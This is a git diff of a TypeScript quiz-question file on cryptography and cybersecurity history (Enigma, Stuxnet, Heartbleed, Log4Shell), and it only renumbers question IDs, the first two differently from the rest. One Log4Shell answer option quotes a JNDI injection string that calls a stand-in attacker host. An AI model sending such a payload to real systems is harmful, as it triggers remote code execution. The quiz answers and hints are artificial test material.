@@ -3,7 +3,7 @@ import type { Question } from '../types';
 export const vaultQuestions: Question[] = [
   // ── Original 6 questions ──────────────────────────────────
   {
-    id: 50001, topic: 'cybersecurity', difficulty: 'hard',
+    id: 4450001, topic: 'cybersecurity', difficulty: 'hard',
     question: 'Clifford Cocks at GCHQ independently invented RSA in 1973, four years before the public discovery. His key insight was:',
     options: [
       'Using the computational hardness of factoring the product of two large primes as a trapdoor function for public-key encryption',
@@ -17,7 +17,7 @@ export const vaultQuestions: Question[] = [
     hint: 'The trapdoor function relies on multiplication being easy but factoring being hard.',
   },
   {
-    id: 50002, topic: 'cybersecurity', difficulty: 'hard',
+    id: 4450002, topic: 'cybersecurity', difficulty: 'hard',
     question: 'IBM discovered differential cryptanalysis in 1974 and designed DES S-boxes to resist it. Differential cryptanalysis works by:',
     options: [
       'Analyzing how specific differences in plaintext pairs propagate through the cipher to produce predictable differences in ciphertext pairs',
@@ -31,7 +31,7 @@ export const vaultQuestions: Question[] = [
     hint: 'It studies how XOR differences between plaintext pairs affect ciphertext differences.',
   },
   {
-    id: 50003, topic: 'cybersecurity', difficulty: 'sota',
+    id: 450003, topic: 'cybersecurity', difficulty: 'sota',
     question: 'The NSA\'s Dual_EC_DRBG backdoor relied on the relationship between two elliptic curve points $P$ and $Q$. If the NSA knew the discrete logarithm $e$ such that $Q = eP$, they could:',
     options: [
       'Predict all future outputs of the pseudorandom number generator from a single 32-byte output sample, enabling decryption of any TLS session using it',
@@ -45,7 +45,7 @@ export const vaultQuestions: Question[] = [
     hint: 'Knowing the discrete log between P and Q lets you reverse-engineer the internal state from any output.',
   },
   {
-    id: 50004, topic: 'cryptography', difficulty: 'hard',
+    id: 450004, topic: 'cryptography', difficulty: 'hard',
     question: 'The VENONA project broke Soviet one-time pad messages — which are theoretically unbreakable (Shannon 1949). This was possible because:',
     options: [
       'Soviet manufacturing errors caused some one-time pad key pages to be duplicated, creating "depth" that enabled cryptanalysis via known-plaintext techniques',
@@ -59,7 +59,7 @@ export const vaultQuestions: Question[] = [
     hint: 'The one-time pad is perfect — but only if you never reuse the pad.',
   },
   {
-    id: 50005, topic: 'cybersecurity', difficulty: 'hard',
+    id: 450005, topic: 'cybersecurity', difficulty: 'hard',
     question: 'Skipjack, the NSA\'s classified block cipher used in the Clipper chip, violated a fundamental cryptographic principle known as:',
     options: [
       'Kirchhoffs\'s principle — a cryptosystem should be secure even if everything about the system, except the key, is public knowledge',
@@ -73,7 +73,7 @@ export const vaultQuestions: Question[] = [
     hint: 'A cipher should be secure even if the enemy knows exactly how it works — only the key should be secret.',
   },
   {
-    id: 50006, topic: 'cryptography', difficulty: 'sota',
+    id: 450006, topic: 'cryptography', difficulty: 'sota',
     question: 'The Enigma machine\'s critical mathematical weakness that Turing exploited was:',
     options: [
       'The reciprocal property — Enigma never encrypted a letter as itself, providing a constraint that eliminated vast portions of the key space',
@@ -88,7 +88,7 @@ export const vaultQuestions: Question[] = [
   },
   // ── 8 NEW questions for new vault entries ──────────────────
   {
-    id: 50007, topic: 'cryptography', difficulty: 'sota',
+    id: 450007, topic: 'cryptography', difficulty: 'sota',
     question: 'Bill Tutte reverse-engineered the Lorenz SZ40/42 cipher machine at Bletchley Park without ever seeing the physical device. His method relied on:',
     options: [
       'Statistical analysis of the depth (overlapping key streams) in two messages encrypted with the same wheel settings, revealing the logical structure of all 12 rotors',
@@ -102,7 +102,7 @@ export const vaultQuestions: Question[] = [
     hint: 'Two messages encrypted with the same settings create a "depth" — the XOR of the plaintexts leaks structural information about the cipher.',
   },
   {
-    id: 50008, topic: 'cryptography', difficulty: 'hard',
+    id: 450008, topic: 'cryptography', difficulty: 'hard',
     question: 'William Friedman\'s team cracked Japan\'s Purple cipher machine in 1940 by deducing that its encryption mechanism used:',
     options: [
       'Telephone stepping switches (6×25 uniselectors) rather than rotors, creating a polyalphabetic substitution with a period determined by the switch stepping sequence',
@@ -116,7 +116,7 @@ export const vaultQuestions: Question[] = [
     hint: 'The repeating period of 25 in the ciphertext pointed to an electromechanical component with exactly 25 positions.',
   },
   {
-    id: 50009, topic: 'cryptography', difficulty: 'hard',
+    id: 450009, topic: 'cryptography', difficulty: 'hard',
     question: 'The Navajo Code Talkers\' code was never broken because it employed a dual-layer encoding system. The first layer was:',
     options: [
       'Substituting military terms with unrelated Navajo words (e.g., "turtle" for "tank"), while the second layer used multiple Navajo words per English letter to prevent frequency analysis',
@@ -130,7 +130,7 @@ export const vaultQuestions: Question[] = [
     hint: 'Having multiple possible encodings for each letter prevents the statistical patterns that frequency analysis exploits.',
   },
   {
-    id: 50010, topic: 'cryptography', difficulty: 'hard',
+    id: 450010, topic: 'cryptography', difficulty: 'hard',
     question: 'The Zimmermann Telegram, decrypted by Room 40 in 1917, proposed that Germany would help Mexico reconquer which US territories?',
     options: [
       'Texas, New Mexico, and Arizona — territories lost in the Mexican-American War of 1846-1848',
@@ -144,7 +144,7 @@ export const vaultQuestions: Question[] = [
     hint: 'The territories named were those Mexico had ceded to the US after the Mexican-American War.',
   },
   {
-    id: 50011, topic: 'cybersecurity', difficulty: 'sota',
+    id: 450011, topic: 'cybersecurity', difficulty: 'sota',
     question: 'Stuxnet targeted Iran\'s nuclear centrifuges at Natanz by manipulating Siemens S7-315/417 PLCs. The worm\'s most sophisticated feature was:',
     options: [
       'A man-in-the-middle attack on physical reality — it replayed normal telemetry to operators while secretly altering centrifuge rotor speeds to cause mechanical failure',
@@ -158,7 +158,7 @@ export const vaultQuestions: Question[] = [
     hint: 'The attack was invisible to operators because the worm showed them what they expected to see, not what was actually happening.',
   },
   {
-    id: 50012, topic: 'cybersecurity', difficulty: 'hard',
+    id: 450012, topic: 'cybersecurity', difficulty: 'hard',
     question: 'The Heartbleed vulnerability (CVE-2014-0160) in OpenSSL allowed attackers to read server memory because:',
     options: [
       'The TLS Heartbeat implementation failed to validate the payload length field, allowing an attacker to request up to 64KB of adjacent memory with each heartbeat request',
@@ -271,7 +271,7 @@ export const vaultQuestions: Question[] = [
     hint: 'Sometimes the best cybersecurity is being so outdated that nobody remembers how your technology works.',
   },
   {
-    id: 50020, topic: 'cryptography', difficulty: 'hard',
+    id: 450020, topic: 'cryptography', difficulty: 'hard',
     question: 'In 2012, a dead WWII carrier pigeon was found in a chimney with an encrypted message. GCHQ attempted to decode it and concluded:',
     options: [
       'The message was likely encrypted with a one-time pad, making it theoretically unbreakable without the specific key page — which was destroyed after the war',
@@ -285,7 +285,7 @@ export const vaultQuestions: Question[] = [
     hint: 'If the key was used once and then destroyed, even the codebreakers who cracked Enigma can\'t help you.',
   },
   {
-    id: 50021, topic: 'cryptography', difficulty: 'sota',
+    id: 450021, topic: 'cryptography', difficulty: 'sota',
     question: 'Cicada 3301\'s recruitment puzzles (2012-2014) required solvers to demonstrate skills across multiple disciplines. The physical component involved:',
     options: [
       'QR codes posted on lampposts in 14 countries simultaneously — Sydney, Seoul, Warsaw, Miami, Paris, and others — requiring a globally distributed solving team',
@@ -299,7 +299,7 @@ export const vaultQuestions: Question[] = [
     hint: 'The puzzle required solvers to physically visit locations around the world — proving the organizers had global reach.',
   },
   {
-    id: 50022, topic: 'cybersecurity', difficulty: 'easy',
+    id: 450022, topic: 'cybersecurity', difficulty: 'easy',
     question: 'During the Y2K midnight rollover on January 1, 2000, the US and Russia took the unprecedented step of:',
     options: [
       'Staffing a joint nuclear command center inside Cheyenne Mountain, Colorado — where Russian and American officers sat side by side monitoring both nations\' nuclear forces',
@@ -413,7 +413,7 @@ export const vaultQuestions: Question[] = [
     hint: 'The most trusted software is the software your vendor digitally signs and delivers through official channels.',
   },
   {
-    id: 50030, topic: 'cybersecurity', difficulty: 'sota',
+    id: 450030, topic: 'cybersecurity', difficulty: 'sota',
     question: 'NSO Group\'s Pegasus spyware achieved "zero-click" exploitation — compromising phones without any user interaction. The primary technique was:',
     options: [
       'Exploiting memory corruption vulnerabilities in media parsers (like iMessage\'s image rendering), sending an invisible message that triggered code execution during automatic parsing',
@@ -427,7 +427,7 @@ export const vaultQuestions: Question[] = [
     hint: 'The exploit targets code that runs automatically when data arrives — before the user makes any decision.',
   },
   {
-    id: 50031, topic: 'cybersecurity', difficulty: 'hard',
+    id: 450031, topic: 'cybersecurity', difficulty: 'hard',
     question: 'The Log4Shell vulnerability (CVE-2021-44228) was trivially exploitable because Log4j\'s JNDI lookup feature would:',
     options: [
       'Interpret special syntax like ${jndi:ldap://attacker.com/x} in any logged string as an instruction to fetch and execute remote Java classes from an attacker-controlled server',
@@ -441,7 +441,7 @@ export const vaultQuestions: Question[] = [
     hint: 'A logging library that interprets user input as code is the textbook definition of an injection vulnerability.',
   },
   {
-    id: 50032, topic: 'cybersecurity', difficulty: 'sota',
+    id: 450032, topic: 'cybersecurity', difficulty: 'sota',
     question: 'The Spectre vulnerability exploits speculative execution in CPUs. The fundamental problem is that:',
     options: [
       'Even when speculative execution is rolled back after a misprediction, the data loaded during speculation remains in the CPU cache, creating a measurable timing side-channel that leaks the data',
@@ -554,7 +554,7 @@ export const vaultQuestions: Question[] = [
     hint: 'Each symmetry has its own conserved quantity — think about what "unchanging in time" should preserve.',
   },
   {
-    id: 50040, topic: 'quantum-computing', difficulty: 'sota',
+    id: 450040, topic: 'quantum-computing', difficulty: 'sota',
     question: 'Shor\'s algorithm factors integers exponentially faster than classical algorithms by using quantum mechanics to efficiently find:',
     options: [
       'The period $r$ of the modular exponentiation function $f(x) = a^x \\mod N$, which is then used to extract factors via $\\gcd(a^{r/2} \\pm 1, N)$',
